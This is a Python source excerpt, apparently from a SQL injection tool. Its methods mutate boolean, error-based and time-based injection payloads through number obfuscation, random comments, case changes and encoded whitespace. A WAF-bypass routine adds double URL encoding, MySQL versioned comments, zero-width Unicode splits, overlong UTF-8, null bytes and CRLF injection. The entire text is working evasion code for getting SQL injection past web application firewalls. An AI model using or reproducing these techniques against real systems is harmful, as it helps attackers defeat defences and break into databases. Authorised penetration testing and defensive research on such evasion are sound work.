    # 
    # CORE MUTATION METHODS
    # 
    
    @staticmethod
    def mutate_number(n: int) -> str:
        """Transform number into equivalent expression (20+ variants)."""
        mutations = [
            # Arithmetic (10 variants)
            lambda x: f"{x-random.randint(1,5)}+{random.randint(1,5)}",
            lambda x: f"{x+random.randint(1,5)}-{random.randint(1,5)}",
            lambda x: f"{x}*1",
            lambda x: f"{x}/1",
            lambda x: f"({x-1}+1)",
            lambda x: f"({x+1}-1)",
            lambda x: f"{x*2}/2",
            lambda x: f"{x*2-x}",
            
            # Bitwise (6 variants)
            lambda x: f"{x}^0",
            lambda x: f"{x}&{x}",
            lambda x: f"{x}|0",
            lambda x: f"~(~{x})",
            lambda x: f"{x}<<0",
            lambda x: f"{x}>>0",
            
            # Functions (4 variants)
            lambda x: f"ABS({x})" if x > 0 else str(x),
            lambda x: f"CEIL({x}.0)" if x > 0 else str(x),
            lambda x: f"FLOOR({x}.9)" if x > 0 else str(x),
            lambda x: str(x),  # No mutation
        ]
        return random.choice(mutations)(n)
    
    def mutate_boolean_payload(self, payload: str) -> str:
        """Apply comprehensive mutations to boolean payload (30+ techniques)."""
        mutated = payload
        
        # Layer 1: Number mutations
        # BUG-FLOAT-LIT-MUTATION FIX (v48): r'\b(\d+)\b' matches individual digits
        # inside float literals like pg_sleep(0.1) because '.' creates word-boundaries
        # on both sides: '0' ends at '.' (wchar→non-wchar boundary) and '1' starts at
        # '.' (non-wchar→wchar boundary).  This converts '1' → '0x1', producing the
        # invalid SQL 'pg_sleep(0.0x1)' (hex literals are integers only in PostgreSQL).
        # Fix: add (?<!\.) to exclude digits immediately after a decimal point, and
        # (?!\.) to exclude digits immediately before one. This preserves float values
        # intact (0.1, 0.3, 1.5 etc.) while still mutating standalone integers (1, 2, 10).
        mutated = re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', lambda m: self.mutate_number(int(m.group(0))), mutated)
        
        # Layer 2: Comment injection (10 variants)
        if random.random() > 0.4:
            comment_styles = [
                f"/*{random.randint(1000,9999)}*/",
                f"/*{random.choice(string.ascii_lowercase)}*/",
                "/**/",
                f"--{random.randint(1000,9999)}\n" if random.random() > 0.8 else "",
            ]
            comment = random.choice(comment_styles)
            # Inject at random positions
            words = mutated.split()
            if len(words) > 2:
                pos = random.randint(1, len(words)-1)
                words.insert(pos, comment)
                mutated = ' '.join(words)
        
        # Layer 3: Case randomization (8 variants)
        if random.random() > 0.5:
            case_style = random.choice([
                'upper',      # SELECT
                'lower',      # select
                'random',     # SeLeCt
                'alternating' # sElEcT
            ])
            
            if case_style == 'random':
                result = []
                for c in mutated:
                    if c.isalpha():
                        result.append(c.upper() if random.random() > 0.5 else c.lower())
                    else:
                        result.append(c)
                mutated = ''.join(result)
            elif case_style == 'upper':
                mutated = re.sub(r'\b(AND|OR|SELECT|FROM|WHERE|IF|CASE|WHEN|THEN|ELSE|END)\b',
                               lambda m: m.group(0).upper(), mutated, flags=_re.IGNORECASE)
            elif case_style == 'alternating':
                result = []
                upper_next = True
                for c in mutated:
                    if c.isalpha():
                        result.append(c.upper() if upper_next else c.lower())
                        upper_next = not upper_next
                    else:
                        result.append(c)
                mutated = ''.join(result)
        
        # Layer 4: Whitespace variation (6 variants)
        if random.random() > 0.6:
            whitespace_styles = [
                "/**/",        # Block comment
                "%09",         # Tab
                "%20",         # Space
                "%0a",         # Newline
                " ",           # Regular space
            ]
            ws = random.choice(whitespace_styles)
            mutated = re.sub(r'\s+', ws, mutated, count=random.randint(1,3))
        
        # Layer 5: Parentheses injection (4 variants)
        if random.random() > 0.7:
            # Add redundant parentheses — BUG-FLOAT-LIT-MUTATION FIX: guard float literals
            mutated = re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'(\1)', mutated, count=random.randint(1,2))
        
        return mutated
    
    def mutate_error_payload(self, payload: str) -> str:
        """Apply mutations to error payload (20+ techniques)."""
        mutated = payload
        
        # Layer 1: Hex marker mutation (6 variants)
        def mutate_hex(match):
            # Keep 0x but change the hex value
            return f"0x{random.randbytes(4).hex()}"
        mutated = re.sub(r'0x[0-9a-fA-F]+', mutate_hex, mutated)
        
        # Layer 2: String mutations (8 variants)
        # Mutate function names randomly
        if random.random() > 0.5:
            mutated = re.sub(r'\b(EXTRACTVALUE|UPDATEXML|CONVERT|CAST)\b',
                           lambda m: ''.join(c.upper() if random.random()>0.5 else c.lower() for c in m.group(0)),
                           mutated, flags=_re.IGNORECASE)
        
        # Layer 3: Comment injection (6 variants)
        if random.random() > 0.5:
            comment = random.choice([
                "/**/",
                f"/*{random.randint(1000,9999)}*/",
                f"--{random.randint(1000,9999)}\n",
            ])
            mutated = re.sub(r'\s+', comment, mutated, count=random.randint(1,2))
        
        # Layer 4: Number mutations in functions
        # BUG-FLOAT-LIT-MUTATION FIX (v48): same guard as Layer 1 above.
        mutated = re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', lambda m: self.mutate_number(int(m.group(0))), mutated)
        
        return mutated
    
    def mutate_timing_payload(self, payload: str) -> str:
        """Apply minimal mutations to timing payload (10+ techniques)."""
        mutated = payload
        
        # Layer 1: Comment injection (preserve timing semantics)
        if random.random() > 0.5:
            comment = random.choice([
                f"/*{random.randint(1000,9999)}*/",
                "/**/",
            ])
            mutated = re.sub(r'\s+', comment, mutated, count=1)
        
        # Layer 2: Case randomization for keywords only
        if random.random() > 0.6:
            mutated = re.sub(r'\b(SLEEP|WAITFOR|pg_sleep|DBMS_LOCK|DBMS_PIPE|RANDOMBLOB)\b',
                           lambda m: ''.join(c.upper() if random.random()>0.5 else c.lower() for c in m.group(0)),
                           mutated, flags=_re.IGNORECASE)
        
        # Layer 3: Whitespace variation (minimal)
        if random.random() > 0.7:
            ws = random.choice(["/**/", "%09", " "])
            mutated = re.sub(r'\s+', ws, mutated, count=1)
        
        return mutated
    
    # 
    # WAF BYPASS TECHNIQUES (50+ Variants)
    # 
    
    def apply_waf_bypass(self, payload: str) -> str:
        """Apply 50+ WAF bypass techniques."""
        techniques = []
        
        # Encoding bypasses (15 variants)
        techniques.extend([
            lambda p: p.replace("'", "%27").replace(" ", "%20") if random.random() > 0.7 else p,
            lambda p: p.replace("'", "%2527") if random.random() > 0.8 else p,  # Double encoding
            lambda p: p.replace(" ", "%09") if random.random() > 0.6 else p,     # Tab
            lambda p: p.replace(" ", "%0a") if random.random() > 0.7 else p,     # Newline
            lambda p: p.replace(" ", "%0d") if random.random() > 0.7 else p,     # Carriage return
            lambda p: p.replace("=", "%3d") if random.random() > 0.7 else p,
            lambda p: p.replace("(", "%28").replace(")", "%29") if random.random() > 0.8 else p,
        ])
        
        # Comment bypasses (10 variants)
        techniques.extend([
            lambda p: p.replace(" AND ", "/**/AND/**/") if " AND " in p and random.random() > 0.5 else p,
            lambda p: p.replace(" OR ", "/**/OR/**/") if " OR " in p and random.random() > 0.5 else p,
            lambda p: p.replace(" SELECT ", "/**/SELECT/**/") if " SELECT " in p.upper() and random.random() > 0.6 else p,
            lambda p: p.replace("SELECT", "/*!12345SELECT*/") if "SELECT" in p.upper() and random.random() > 0.7 and self.dbms in ("MySQL", "MariaDB") else p,
            lambda p: re.sub(r'\s+', "/**/", p, count=1) if random.random() > 0.6 else p,
        ])
        
        # Case variation bypasses (8 variants)
        techniques.extend([
            lambda p: re.sub(r'\b(SELECT|UNION|FROM|WHERE)\b', lambda m: ''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(m.group(0))), p, flags=_re.IGNORECASE) if random.random() > 0.6 else p,
            lambda p: p.replace("SELECT", "SeLeCt") if "SELECT" in p.upper() and random.random() > 0.6 else p,
            lambda p: p.replace("UNION", "UnIoN") if "UNION" in p.upper() and random.random() > 0.6 else p,
        ])
        
        # Unicode bypasses (8 variants)
        techniques.extend([
            lambda p: p.replace("SELECT", "SE%E2%80%8BLECT") if "SELECT" in p.upper() and random.random() > 0.8 else p,  # Zero-width space
            lambda p: p.replace("UNION", "UN%E2%80%8BION") if "UNION" in p.upper() and random.random() > 0.8 else p,
            lambda p: p.replace("'", "%C0%27") if random.random() > 0.9 else p,  # Overlong UTF-8
        ])
        
        # Null byte injection (4 variants)
        techniques.extend([
            lambda p: p.replace(" ", "%00 ") if random.random() > 0.85 else p,
            lambda p: p + "%00" if random.random() > 0.85 else p,
        ])
        
        # CRLF injection (5 variants)
        techniques.extend([
            lambda p: p.replace("--", "%0d%0a--") if "--" in p and random.random() > 0.7 else p,
            lambda p: p.replace(";", "%0d%0a;") if ";" in p and random.random() > 0.7 else p,
        ])
        
        # Apply 2-5 random bypass techniques
        selected = random.sample(techniques, k=min(random.randint(2, 5), len(techniques)))
        for technique in selected:
            try:
                payload = technique(payload)
            except:
                continue
        
        return payload
    
